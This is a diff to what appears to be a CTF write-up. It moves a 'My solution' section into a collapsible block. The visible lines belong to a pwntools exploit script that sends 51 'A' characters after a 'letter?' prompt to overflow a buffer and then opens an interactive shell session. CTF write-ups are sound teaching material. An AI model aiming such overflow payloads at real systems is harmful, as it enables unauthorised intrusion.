@@ -27,9 +27,10 @@ arr | vuln
 AAAA ... AAAA | A
 
 
+<details>
+  <summary>My solution</summary>
 
-My solution:
-```py
+  ```py
 from pwn import *
 
 #context.log_level = "debug"
@@ -50,4 +51,6 @@ payload = "A"*51
 p.sendlineafter("letter?", payload)
 
 p.interactive()
-```
+  ```
+
+</details>
